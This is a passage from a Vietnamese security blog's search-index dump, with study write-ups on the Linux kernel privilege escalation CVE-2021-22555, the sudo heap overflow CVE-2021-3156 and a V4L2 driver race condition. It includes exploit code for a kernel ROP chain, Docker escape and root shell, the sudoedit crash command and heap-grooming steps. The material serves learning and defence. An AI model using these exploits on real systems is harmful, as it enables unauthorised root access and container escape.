MOV_RSP_RBP_POP_RBP_RET; #endif } Nguyên tắc hoạt động của Kernel ROP chain là: Lưu giá trị của RBP tại một số scratchpad address (scratchpad giống như một mẫu giấy ghi chú để lưu trữ những kiến thức tạm thời khi bạn đọc 1 cuốn sách) để sau này sử dụng. Gọi hàm commit_creds(prepare_kernel_cred(NULL)) để cài đặt kernel credentials Gọi hàm switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) để chuyển không gian tên namespace của process 1 thành một trong những init process. Khôi phục lại giá trị của RBP và quay lại luồng thực thi cũ (ngay sau hàm free_pipe_info()) Releasing pipe_buffer objects\u0026hellip; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // Trigger pipe_release(). printf(\u0026#34;[*] Releasing pipe_buffer objects...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_PIPEFDS; i++) { if (close(pipefd[i][0]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } if (close(pipefd[i][1]) \u0026lt; 0) { perror(\u0026#34;[-] close\u0026#34;); goto err_rmid; } } printf(\u0026#34;[*] Checking for root...\\n\u0026#34;); if ((fd = open(\u0026#34;/etc/shadow\u0026#34;, O_RDONLY)) \u0026lt; 0) { printf(\u0026#34;[-] Error could not gain root privileges.\\n\u0026#34;); goto err_rmid; } close(fd); printf(\u0026#34;[+] Root privileges gained.\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); Sau khi đã xây dựng xong kernel_rop, chúng ta tiến hành giải phóng các vùng nhớ pipe_buffer để kích hoạt hàm pipe_release(). Bước này ta dùng vòng for để đi qua hết tất cả các pipe filedescriptor và dùng lệnh close để giải phóng vùng nhớ. dòng lệnh 33-38 dùng để kiểm tra xem liệu chúng ta đã lấy được root hay chưa vì tệp /etc/shadow chỉ được đọc bởi root. STAGE 5: Post-exploitation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 printf(\u0026#34;[+] STAGE 5: Post-exploitation\\n\u0026#34;); printf(\u0026#34;[*] Escaping container...\\n\u0026#34;); setns(open(\u0026#34;/proc/1/ns/mnt\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/pid\u0026#34;, O_RDONLY), 0); setns(open(\u0026#34;/proc/1/ns/net\u0026#34;, O_RDONLY), 0); printf(\u0026#34;[*] Cleaning up...\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_MSQIDS; i++) { // TODO: Fix next pointer. if (i == fake_idx) continue; if (msgctl(msqid[i], IPC_RMID, NULL) \u0026lt; 0) perror(\u0026#34;[-] msgctl\u0026#34;); } for (int i = 0; i \u0026lt; NUM_SOCKETS; i++) { if (close(ss[i][0]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); if (close(ss[i][1]) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); } if (close(s) \u0026lt; 0) perror(\u0026#34;[-] close\u0026#34;); printf(\u0026#34;[*] Popping root shell...\\n\u0026#34;); char *args[] = {\u0026#34;/bin/bash\u0026#34;, \u0026#34;-i\u0026#34;, NULL}; execve(args[0], args, NULL); return 0; Đây là đoạn lệnh cho phép chúng ta thoát khỏi docker. Khi đã có root, chúng ta tiến hành thay đổi mnt, pid, net namespace để cho phép chúng ta thoát khỏi container. Đoạn lệnh 4-6 thực hiện sự thay đổi này. Đoạn lệnh từ dòng 8-23 thực hiện thao tác dọn dẹp các message queue, đóng tất cả các socketpair. Cuối cùng thực hiện lệnh để chạy shell của root dòng 25-27 Tóm lại Bài này tôi chỉ viết lại từ bài viết chính của tác giả, thêm vào đó, là những giải thích của tôi về những vấn đề tác giả chưa nói rõ hoặc quá căn bản với tác giả nhưng không hề với tôi. Vì kiến thức tôi còn hạn chế, nên những giải thích có thể đúng hoặc sai, nếu sai, rất mong nhận được sự góp để hoàn thiện hơn. Lời cuối, chân thành cảm ơn sự cống hiến của tác giả - Andy Nguyen (theflow@) - đặc biệt poc của anh, đã giúp tôi rất nhiều trong quá trình nâng cao kĩ năng của mình. Nguồn tham khảo CVE-2021-22555: Turning \\x00\\x00 into 10000$ CVE-2021-22555: Linux kernel privilege escalation causes Docker to escape ","description":"Lỗi heap out-of-bound","id":3,"section":"posts","tags":["cve,  escape_docker"],"title":"Tìm hiểu về CVE-2021-22555","uri":"https://minhlongmt183.github.io/posts/cve-2021-22555/"},{"content":"Docker security Docker security non-events Protect the Docker daemon socket Using certificates for repository client verification User trusted images Antivirus software AppArmor security profiles Seccomp security profiles Chế độ điện toán an toàn Secure computing mode (seccomp) là một tính năng của Linux kernel, dùng để hạn chế một số action trong container. Hàm seccomp() system call dùng để xử lí trạng thái của seccomp.\n","description":"Docker Security","id":4,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P8)","uri":"https://minhlongmt183.github.io/posts/docker_p8/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn.\rTổng quan Lỗi của CVE này thuộc loại heap-based buffer overflow trong sudo. Cụ thể:\nNó cho phép người dùng bình thường lấy được root mà không cần biết mật khẩu của root. Những phiên bản bị ảnh hưởng: legacy có phiên bản của sudo từ 1.8.2 - 1.8.31p2 stable có phiên bản của sudo từ 1.9.0 - 1.9.5p1 Trong bài viết này, tôi tiến hành khai thác trên Ubuntu 18.04.5 LTS có phiên bản của sudo: 1 2 3 4 5 6 edisc@ubuntu:~$ sudo -V Sudo version 1.9.5p1 Sudoers policy plugin version 1.9.5p1 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.5p1 Sudoers audit plugin version 1.9.5p1 Phân tích Bức tranh sơ lược Khi Sudo được thực thi ở chế độ command line: Nếu sử dụng tùy chọn -s, thì Sudo's MODE_SHELL flag sẽ được bật. Nếu sử dụng tùy chọn -i, thì Sudo's MODE_SHELL và MODE_LOGIN_SHELL flags sẽ được bật. Khi thực thi, bắt đầu hàm main() của Sudo, hàm parse_args() sẽ viết lại argv (dòng 609-617) bằng cách nối tất cả các command-line arguments (dòng 587-595) và thêm vào trước các kí tự đặc biệt một dấu backslashes \\. (dòng 590-591): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { 572 char **av, *cmnd = NULL; 573 int ac = 1; ... 581 cmnd = dst = reallocarray(NULL, cmnd_size, 2); ... 587 for (av = argv; *av != NULL; av++) { 588 for (src = *av; *src != \u0026#39;\\0\u0026#39;; src++) { 589 /* quote potential meta characters */ 590 if (!isalnum((unsigned char)*src) \u0026amp;\u0026amp; *src != \u0026#39;_\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;-\u0026#39; \u0026amp;\u0026amp; *src != \u0026#39;$\u0026#39;) 591 *dst++ = \u0026#39;\\\\\u0026#39;; 592 *dst++ = *src; 593 } 594 *dst++ = \u0026#39; \u0026#39;; 595 } ... 600 ac += 2; /* -c cmnd */ ... 603 av = reallocarray(NULL, ac + 1, sizeof(char *)); ... 609 av[0] = (char *)user_details.shell; /* plugin may override shell */ 610 if (cmnd != NULL) { 611 av[1] = \u0026#34;-c\u0026#34;; 612 av[2] = cmnd; 613 } 614 av[ac] = NULL; 615 616 argv = av; 617 argc = ac; 618 } Sau đó, trong hàm sudoers_policy_main(), hàm set_cmnd() nối tất cả các command-line arguments vào heap-based buffer \u0026quot;user_args\u0026quot; (dòng) 864-871) và bỏ qua kí tự \\ dòng 866-867. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 852 for (size = 0, av = NewArgv + 1; *av; av++) 853 size += strlen(*av) + 1; 854 if (size == 0 || (user_args = malloc(size)) == NULL) { ... 857 } 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { ... 864 for (to = user_args, av = NewArgv + 1; (from = *av); av++) { 865 while (*from) { 866 if (from[0] == \u0026#39;\\\\\u0026#39; \u0026amp;\u0026amp; !isspace((unsigned char)from[1])) 867 from++; 868 *to++ = *from++; 869 } 870 *to++ = \u0026#39; \u0026#39;; 871 } ... 884 } ... 886 } Nếu command-line argument kết thúc với single backslash: Tại dòng 866, from[0] = '\\\\' và from[1]=NULL. Tại dòng 867, from tăng 1 đơn vị, from trỏ tới NULL - from=NULL. Tại dòng 868, NULL sẽ được copy vào user_args buffer, và from tăng 1 đơn vị, trỏ đến giá trị sau NULL (out of the argument\u0026rsquo;s bounds). Vòng lặp while tại dòng 865-869 sẽ đọc và copy vùng dữ liệu out-of-bounds vào user_args buffer. Dễ thấy, set_cmnd() là nguyên nhân dẫn tới lỗ hổng heap-based buffer overflow, bởi vì vùng dữ liệu out-of-bounds đã được copy vào user_args buffer, tuy nhiên nó lại không chỉ định kích thước của chúng (kích thước được tính toán tại dòng 852-853) Về lí thuyết, không có command-line argument nào có thể kết thúc bằng dấu \\ bởi vì: Nếu MODE_SHELL hay MODE_LOGIN_SHELL được bật (line 858 - điều kiện cần để đến vùng code bị lỗi), thì MODE_SHELL được bật (dòng 571) và hàm parse_args() sẽ thêm kí tự \\ vào các kí tự đặc biệt (meta-characters) bao gồm cả \\ (nó sẽ thay \\ thành \\\\) Tuy nhiên, nếu quan sát kĩ, chúng ta sẽ thấy điều kiện gọi hàm của set_cmnd() và parse_args() có một chút khác biệt: 1 2 3 819 if (sudo_mode \u0026amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) { ... 858 if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) { khác với\n1 571 if (ISSET(mode, MODE_RUN) \u0026amp;\u0026amp; ISSET(flags, MODE_SHELL)) { Câu hỏi đặt ra ở đây, liệu rằng ta có thể bật một trong ba mode MODE_EDIT, MODE_CHECK, MODE_SHELL mà không cần phải bật MODE_RUN - kích hoặc escape code không? Câu trả lời hầu như không thể, bởi vì: Nếu ta bật MODE_EDIT (tùy chọn -e, dòng 361) hay MODE_CHECK (tùy chọn -l, dòng 423 và 519), thì hàm parse_args() sẽ xóa MODE_SHELL từ valid_flags (dòng 363 và 424), trả về lỗi nếu tìm thấy invalid flag như MODE_SHELL (dòng 532-533): 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 358 case \u0026#39;e\u0026#39;: ... 361 mode = MODE_EDIT; 362 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 363 valid_flags = MODE_NONINTERACTIVE; 364 break; ... 416 case \u0026#39;l\u0026#39;: ... 423 mode = MODE_LIST; 424 valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; 425 break; ... 518 if (argc \u0026gt; 0 \u0026amp;\u0026amp; mode == MODE_LIST) 519 mode = MODE_CHECK; ... 532 if ((flags \u0026amp; valid_flags) != flags) 533 usage(1); May mắn thay, chúng vẫn tồn tại một sơ hở: Nếu chúng ta thực thi Sudo là sudoedit thay vì sudo, parse_args() sẽ tự động bật MODE_EDIT (dòng 270) nhưng không xóa các valid_flags, và MODE_SHELL lại nằm trong danh sách các valid_flags này (dòng 127 và 249): 1 2 3 4 5 6 7 8 9 10 127 #define DEFAULT_VALID_FLAGS (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) ... 249 int valid_flags = DEFAULT_VALID_FLAGS; ... 267 proglen = strlen(progname); 268 if (proglen \u0026gt; 4 \u0026amp;\u0026amp; strcmp(progname + proglen - 4, \u0026#34;edit\u0026#34;) == 0) { 269 progname = \u0026#34;sudoedit\u0026#34;; 270 mode = MODE_EDIT; 271 sudo_settings[ARG_SUDOEDIT].value = \u0026#34;true\u0026#34;; 272 } Việc này dẫn đến: nếu chúng ta thực thi sudoedit -s, sau đó bật MODE_EDIT và MODE_SHELL nhưng không bật MODE_RUN, chúng ta sẽ tránh được escape code và đi đến vùng code bị lỗi. Sau đó, overflow heap-based buffer \u0026ldquo;user_args\u0026rdquo; thông qua command-line argument mà kết thúc bằng dấu backslash. 1 2 3 4 5 6 7 8 edisc@ubuntu:~$ sudo -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` [sudo] password for edisc: Sorry, try again. [sudo] password for edisc: sudo: 1 incorrect password attempt edisc@ubuntu:~$ sudoedit -s \u0026#39;\\\u0026#39; `perl -e \u0026#39;print \u0026#34;A\u0026#34; x 65536\u0026#39;` Segmentation fault (core dumped) edisc@ubuntu:~$ Dưới góc nhìn của kẻ tấn công, buffer overflow trong trường hợp này khá lí tưởng, bởi vì: Chúng ta có thể kiểm soát được kích thước của vùng nhớ mà chúng ta overflow: user_args buffer (dòng 852-854) Chúng ta hoàn toàn độc lập trong việc kiểm soát kích thước và nội dung của vùng nhớ bị overflow (dòng 852-853) Chúng ta thậm chí có thể viết null bytes vào vùng nhớ bị overflow (tham số hoặc biến môi trường kết thúc bằng \\ sẽ viết 1 null byte vào \u0026ldquo;user_args\u0026rdquo; dòng 866-868) Ví dụ, trên amd64 Linux, chúng ta có thể cấp phát 24 bytes trong user-args buffer (32-heap chunk) và ghi đè những field của chunk tiếp theo với A=a\\0B=b\\0, ghi đè trường fd với C=c\\0D=d\\0 và trường bk với E=e\\0F=f\\0: 1 2 3 4 5 6 7 8 ------------------------------------------------------------------------ env -i \u0026#39;AA=a\\\u0026#39; \u0026#39;B=b\\\u0026#39; \u0026#39;C=c\\\u0026#39; \u0026#39;D=d\\\u0026#39; \u0026#39;E=e\\\u0026#39; \u0026#39;F=f\u0026#39; sudoedit -s \u0026#39;1234567890123456789012\\\u0026#39; ------------------------------------------------------------------------ --|--------+--------+--------+--------|--------+--------+--------+--------+-- | | |12345678|90123456|789012.A|A=a.B=b.|C=c.D=d.|E=e.F=f.| --|--------+--------+--------+--------|--------+--------+--------+--------+-- size \u0026lt;---- user_args buffer ----\u0026gt; size fd bk fd: forward\nbk: backward\nlà hai con trỏ trong cấu trúc heap\rTrace Heap Usages Để hiểu được luồng thực thi của heap, chúng ta sẽ trace heap usage trên Ubuntu 18.04 từ malloc,realloc, calloc và hàm free với gdb script 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 main() |- setlocale(LC_ALL, \u0026#34;\u0026#34;); |- tzset() |- sudo_conf_read_v1(CONF_DEBUG) | |- setlocale(\u0026#34;C\u0026#34;) // lưu vị trí hiện tại đầu tiên | |- read /etc/sudo.conf | |- setlocale(prev_locale) // khôi phục lại locale |- sudo_conf_read_v1(CONF_ALL) / giống với ở trên |- get_user_info() | |- getpwuid() | | |- parse /etc/nsswitch.conf and create service_user structs |- parse_args() |- sudo_load_plugins() | |- load sudoers.so | |- register env hooks |- policy_open() | |- format_plugin_settings() | | |- initialize sudo settings such as network_addrs (many mallocs) | |- sudoers_policy_init() | | |- init_defaults() | | | |- Nhiều chuỗi ngắn gọi strdup() (kể cả def_timestampdir) | | | |- một số chuỗi gọi dcgettext để cấp phát. | | | |- init_envtables() // tạo ra nhiều malloc() nhỏ | | |- init_vars() | | |- sudo_file_parse() load và parse /etc/sudoers |- policy_check() | |- sudoers_policy_main() | | |- set_cmnd() Luồng thực thi từ một hàm xảy ra lỗi yêu cầu password.\n1 2 3 4 5 6 7 8 9 10 11 12 13 |- set_cmnd() // lỗ hổng ở đây |- setlocale(\u0026#34;C\u0026#34;) |- sudo_file_lookup() // tìm kiếm dữ liệu được phân tích từ /etc/sudoers | |- nss_* | | |- nss_load_library() |- setlocale(user_locale) // khôi phục lại locale |- check_user() | |- check_user_interactive() | | |- tạo tệp timestamp trong def_timestampdir | | |- yêu cầu mật khẩu (nếu xác thực thất bại, thoát) | |- find_editer() | |- call sudoer_hook_env(\u0026#34;SUDO_EDITOR\u0026#34;) // chỉ được gọi nếu xác thực thành công. đã chạy gdbscript nhưng vẫn chưa note lại để kiểm tra xem cấu trúc có giống với tác giả chưa Đã làm được\rXác định những đối tượng có thể bị overwriting Với luồng thực thi trên, có một số đối tượng (objects) được cấp phát trước khi chúng ta muốn tiến hành heap overflow và được sử dụng sau đó (lí tưởng cho việc ghi đè). nss service_user object def_timestampdir path compar function pointer in rbtree struct - Con trỏ hàm có thể bị ghi đè từng phần để bypass ASLRS (dùng một đoạn code bruteforcing), tuy nhiên tham số đầu tiên lại là chuỗi rỗng. userspects object from parsing /etc/sudoers: có khả năng bypass xác thực trên sudo có phiên bản \u0026gt;= 1.8.9 nhưng phải làm giả nhiều đối tượng (fake many objects). glibc heap with/without tcache Từ glibc phiên bản 2.25, tcache được thêm vào heap allocation. So sánh giữa tcache bins và fast bins: Giống: Cả 2 đều đánh dấu đã được sử dụng. Đều là LIFO (Last In, First Out). Có thể cấp phát lại nếu kích thước yêu cầu cấp phát trùng với kích thước của bin. Khác: Max fast bín size là 0x80, còn max tache bins size là 0x410. Khi kích thước yêu cầu cấp phát lớn hơn small bins (0x400), tất cả các fast bins được đưa vào unsorted bins, sau đó chúng được tập hợp lại, đưa vào bin nhỏ hơn hoặc lớn hơn. Có nhiều cấp phát yêu cầu khích thước lớn (như file buffer trong glibc) trong các chương trình chạy ở quyền sudo. Với tache bín, large chunk dược cấp phát sẽ không bị ảnh hưởng trong tcahe bins. Những free chunks với những kích thước nhất định sẽ nằm trong tache bin mãi. Khai thác glibc setlocale Khi hàm setlocale được gọi với chuỗi rỗng, những biến môi trường LC_* được sử dụng như đầu vào cho hàm _nl_find_locale: 1 2 3 4 5 6 7 8 9 10 11 12 13 115 if (cloc_name[0] == \u0026#39;\\0\u0026#39;) 116 { 117 /* The user decides which locale to use by setting environment 118 variables*/ 119 cloc_name = getenv(\u0026#34;LC_ALL\u0026#34;); 120 if (!name_present(cloc_name)) 121 cloc_name = getenv(_nl_category_name.str 122 + _nl_category_name_idxs[category]); 123 if (!name_present(cloc_name)) 124 cloc_name = getenv(\u0026#34;LANG\u0026#34;); 125 if (!name_present(cloc_name)) 126 cloc_name = _nl_C_name; 127 } Đoạn code trên, ta thấy ưu tiên cho việc lấy locale name cho mỗi danh mục là LC_ALL, LC_\u0026lt;CATEGORY_NAME\u0026gt;, LANG environment. Nếu không có gì được thiết lập, special locale name \u0026quot;C\u0026quot; được sử dụng. Nếu locale name là \u0026ldquo;C\u0026rdquo;, hàm _nl_find_locale sẽ trả về ngay lập tức mà không đi tới heap, với những tên khác, flow sẽ như sau: 1 2 3 4 5 6 7 8 9 10 11 185 /*LOCALE can consist of up to four recognized parts for the XPG syntax: 186 language[_territory[.codeset]][@modifier] 187 188 Beside the first all of them are allowed to be missing. If the full specified locale is not found, the less specific one are looked for. The various part will be stripped off according to the following order: 189 (1) codeset 190 (2) normalized codeset 191 (3) territory 192 (4) modifier */ mask = _nl_explode_name (loc_name, \u0026amp;language, \u0026amp;modifier, \u0026amp;territory, \u0026amp;codeset, \u0026amp;normalized_codeset); Giá trị trả về mark là cờ để chỉ ra sự tồn tại của các phần này trong locale name được nhận. Sau đó hàm _nl_make_l10nflist được gọi để kiểm tra liệu locale name đã nhận có được tải lên hay chưa? Điều này yêu cầu malloc để lưu đầy đủ tên thư mục. Nếu nó nằm trong danh sách/lệnh gọi chỉ để nhận, giải phóng nó rồi trả về.\n1 2 3 4 5 6 7 8 9 10 11 12 165 /*Allocate room for the full file name. */ 166 abs_filename = (char *) malloc(dirlist_len 167 + strlen(language) 168 + ((mask \u0026amp; XPG_TERRITORY) != 0 169 ? strlen (codeset) + 1 : 0) 170 + ((mask \u0026amp; XPG_CODESET) != 0 171 ? strlen(normalized_codeset) + 1 : 0) 172 + ((mask \u0026amp; XPG_NORM_CODESET) != 0 173 ? strlen(normalized_codeset) + 1 : 0) 174 + ((mask \u0026amp; XPG_MODIFIER) != 0 175 ? strlen(modifier) + 1 : 0) 176 + 1 + strlen(filename) +1); Nếu locale name không nằm trong danh sách được load, hàm _nl_make_l10nflist được gọi một lần nữa để tạo ra tất cả các đường dẫn có thể (đường dẫn cơ bản là /usr/lib/locale) từ việc kết hợp những thành phần và đặc tính của tên bằng gọi đệ quy chính đó với \u0026ldquo;mask\u0026rdquo; đã được sửa đổi. Thuật toán này sẽ tạo ra một duplicated part (malloc) và rồi xóa nó (free) sau khi kiểm tra xong. Càng nhiều thành phần trong locales thì sẽ có càng nhiều hàm malloc và free được gọi. Sau đó, hàm _nl_find_locale cố gắng load locale data từ từng đường dẫn một. Nếu tìm thấy một locale data hợp lệ, hàm setlocale sẽ sawpx xếp tên miền nhất định và lưu nó trong nội bộ. Nếu có lỗi xảy ra, hàm setlocale sẽ giải phóng tất cả các tên đã được lưu và mặc định sử dụng C rồi trả về ngay lâp tức. Do đó, locale name không thể ngẫu nhiên, ít nhất ngôn ngữ và bộ mã phải hợp lệ. Sau khi tất cả tên danh mục đều được strdup() và dữ liệu được load, LC_ALL sẽ được tạo trong hàm new_composite_name. Nếu tất cả các tên LC giống nhau, giá trị của nó sẽ chỉ được lấy từ tên đầu tiên, ngược lại, nếu không giống, giá trị sẽ được kết hợp lại với nhau. Kiểm soát heap usage bằng biến môi trường. Một số giá trị của biến môi trường giúp cho việc khai thác lỗi này:\nThiết lập môi trường \u0026quot;TZ=:\u0026quot;: giảm số lần sử dụng heap trong hàm glibc tzset() và hoàn toàn có thể tiên đoán trước. Thêm \u0026quot;;x=x\u0026quot; trong mọi biến môi trường LC, luồng thực thi sẽ như sau: Đầu tiên, hàm setlocale(\u0026quot;\u0026quot;) sẽ cấp phát và giải phóng một cách bình thường, LC_ALL sẽ có giá trị \u0026quot;...;x=x;...\u0026quot; Sau đó, setlocale(NULL) lấy giá trị LC_ALL hiện tại và lưu lại. setlocale(\u0026quot;C\u0026quot;) sẽ giải phóng tất cả locale name nhận được. setlocale(saved_LC_ALL) sẽ không làm gì, vì x là tên danh mục không hợp lệ. Tới đây, LC_ALL trong glibc là \u0026ldquo;C\u0026rdquo; setlocale sẽ không làm gì bởi vì LC_ALL là C Kết quả chúng ta sẽ có một vùng được giải phóng với kích thước được kiểm soát bằng cách thiết lập môi trường LC Cấu trúc service_user 1 2 3 4 5 6 7 8 9 10 11 12 13 typedef struct service_user { /* And the link to the next entry. */ struct service_user *next; /* Action according to result. */ lookup_actions actions[5]; /* Link to the underlying library object. */ service_library *library; /* Collection of known functions. */ void *known; /* Name of the service (`files\u0026#39;, `dns\u0026#39;, `nis\u0026#39;, ...). */ char name[0]; } service_user; -Cấu trúc này được sử dụng trong nss_load_library của libc khá thường xuyên khi vấn đề overflow xảy ra (trace log) để load những thư viện liên kết động lên. Chúng ta có thể ghi đè trường name và tải thư viện của chúng ta lên.\nSau đó, chúng ta nhắm tới những thư viện mà không có đặc quyền, chạy nó với quyền root. Hàm như sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 static int nss_load_library (service_user *ni) { if (ni-\u0026gt;library == NULL) { static name_database default_table; ni-\u0026gt;library = nss_new_service (service_table ?: \u0026amp;default_table, ni-\u0026gt;name); if (ni-\u0026gt;library == NULL) return -1; } if (ni-\u0026gt;library-\u0026gt;lib_handle == NULL) { /* Load the shared library. */ size_t shlen = (7 + strlen (ni-\u0026gt;name) + 3 + strlen (__nss_shlib_revision) + 1); int saved_errno = errno; char shlib_name[shlen]; /* Construct shared object name. */ __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name, \u0026#34;libnss_\u0026#34;), ni-\u0026gt;name), \u0026#34;.so\u0026#34;), __nss_shlib_revision); ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen (shlib_name); Mục tiêu của hàm này là đến ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen(shlib_name) để tải thư viện mà chúng ta kiểm soát. Có hai điều mà chúng ta cần lưu ý: Nếu ni-\u0026gt;library khác NULL, chúng ta sẽ sử dụng con trỏ trong ni-\u0026gt;library-\u0026gt;lib_handle và vì ASLR nên chúng ta không thể đoán liệu rằng con trỏ này có hợp lệ hay không. Chúng ta thiết lập ni-\u0026gt;library=nss_new_service(...) nếu con trỏ này NULL, sau đó chúng ta chỉ cần ghi đè cấu trúc này để lấy được tên trường và đổi nó tới những thư viện mà chúng ta kiểm soát. Thách thức thứ 2 là chúng ta có con trỏ struct service_user *next. Nếu chúng ta gây ra overflow Ghi đè cấu trúc service_user bằng glibc tcache Từ trace log, chúng ta thấy 2 lệnh gọi nss_load_library. Sau đó ta kiểm tra xem service_user object được tạo ở vị trí nào\nNó được tạo từ \u0026ldquo;nhóm\u0026rdquo; các dòng trong file \u0026ldquo;nsswitch.conf\u0026rdquo;. Như chúng ta thấy, sudo sẽ tạo ra service_user objects (từ 2 dịch vụ trong passwd line). Do đó, mã thực thi của chúng ta sẽ đọc file nsswitch.conf đẻ xác định offset hoặc số lượng chunk size = 0x40 được tạo. Thiết lập TZ=: và ;x=x trong môi trường LC sẽ giúp chúng ta điều khiển việc sử dụng heap trước khi phân tích file \u0026quot;/etc/nsswitch.conf\u0026quot; Trace hàm malloc/free từ lệnh gọi hàm sudo_conf_read_v1 tới lệnh get_user_info ta sẽ được như dưới\nlàm sao để trace được như tác giả\rVí dụ, ta thiết lập môi trường \u0026quot;LC_CTYPE=C.UTF-8@\u0026quot; + \u0026quot;A\u0026quot;*0x28 và \u0026quot;LC_NUMERIC=C.UTF-8@\u0026quot;+\u0026quot;A\u0026quot;*0x86. Chunk size của LC_CTYPE là 0x30+8 (8 là kích thước của heap metadata), sau đó được làm tròn lên 0x40 và chunk size của LC_NUMERIC là 0x80. Rồi chúng ta sẽ được bố cục tượng tự như hình bên cho nsswitch.conf với 2 dịch vụ cho passwd. 1 2 3 4 LC_COLLATE LC_TIME LC_NUMERIC LC_CTYPE --+-------------+----+------------+---+-------------+---+-------------+--- | free 0x40 | .. | free 0x40 |...| free 0x80 |...| freed 0x40 | --+-------------+----+------------+---+-------------+---+-------------+--- Do đó, sẽ hướng đến servirce_user object tại vùng nhớ LC_CTYPE bị giải phóng và thực hiện heap overflow tại LC_NUMERIC để ghi đè service_user object\n","description":"Lỗi cho phép người dùng bình thường lấy được root mà không cần biết mật khẩu của root","id":5,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"Tìm hiểu về CVE-2021–3156 (A Sudo vulnerability)","uri":"https://minhlongmt183.github.io/posts/cve-2021-3156/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem\rVulnerabilities chúng ta tải source code kernel về và xem tại: linux-x/drivers/media/platform/vivid/\rLỗ hổng bắt nguồn từ sai sót trong hiện thực, sử dụng mutex lock của driver vivid trong subsystem V4L2 - (drivers/media/platform/vivid). Driver này không yêu cầu bất cứ phần cứng đặc biệt nào. Nó đóng vai trò như một kernel module (CONFIG_VIDEO_VIVID=m) trong các hệ điều hành như: Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE. Driver vivid mô phỏng phần cứng video4linux của nhiều loại: video capture, video output, radio receivers and transmitters and a software defined radio receivers. Những input và output sẽ hoạt động giống như những thiết bị vật lí thật, do đó, nó cho phép ứng dụng thực hiện mà không cần bất cứ thiết bị phần cứng đặc biệt nào. Trên Ubuntu, những thiết bị được tạo bởi driver vivid đều hoạt động cho người dùng bình thường, vì ubuntu sử dụng RW USAL khi người dùng đăng nhập open, read và close trong vivid open Hàm này thì không có gì đặc biệt với trường hợp lỗi này, nó chỉ đơn giản được gọi để bật thiết bị\nread Chúng ta cùng theo flow của lệnh read này\nstateDiagram\rread --\u0026gt; vfd_read\rvfd_read --\u0026gt; vb2_fop_read\rvb2_fop_read --\u0026gt; __vb2_perform_fileio\r__vb2_perform_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; vb_queue_alloc\r__vb2_perform_fileio --\u0026gt; vb2_core_qbuf\r__vb2_perform_fileio --\u0026gt; vb2_core_streamon\rvb2_core_streamon --\u0026gt; vb2_start_streaming\rvb2_start_streaming --\u0026gt; __enqueue_in_driver\rvb2_start_streaming --\u0026gt; vbi_cap_start_streaming\r__vb2_perform_fileio --\u0026gt; vb2_core_dqbuf vb2_queue: hàng đợi này sẽ chứa vb2_buffer của ứng dụng, được lưu ở `vb2_queue-\u0026gt;bufs) vb2_buffer: lưu thông tin về các hoạt động của video stream. Khi lệnh read thực hiện, nó gọi vb_queue_alloc để cấp phát vùng nhớ (kmalloc-1k) để chứa những thông tin từ vb2_buffer và sau đó lấy những thông tin này ra để thực hiện. Quá trình data streaming thực chất là quá trình viết và đọc từ buffer vb2_buffer được thêm vào vb2_queue (vb2_queue-\u0026gt;queued_list) Điều chú ý ở đây, khóa dev-\u0026gt;mutex của vb2_fop_read và khóa tại vb2_queue-\u0026gt;lock là một khóa. xem hiện thực tại đây Sau khi vb_buffer được thêm vào hàng đợi, chương trình sẽ bắt đầu streaming, gọi vb2_start_streaming để đưa dữ liệu vào vb_buffer. Quá trình này nó sẽ gọi __enqueue_in_driver để thêm buffer vào vivid_dev, hàng đợi vid_cap_active để được xử lí. Quá trình trên tương đương với việc gọi hàm vid_cap_buf_queue 1 2 3 4 5 6 7 8 9 10 static void vid_cap_buf_queue(struct vb2_buffer *vb) { struct vb2_v4l2_buffer *vbuf = to_vb2_v4l2_buffer(vb); struct vivid_dev *dev = vb2_get_drv_priv(vb-\u0026gt;vb2_queue); struct vivid_buffer *buf = container_of(vbuf, struct vivid_buffer, vb); spin_lock(\u0026amp;dev-\u0026gt;slock); 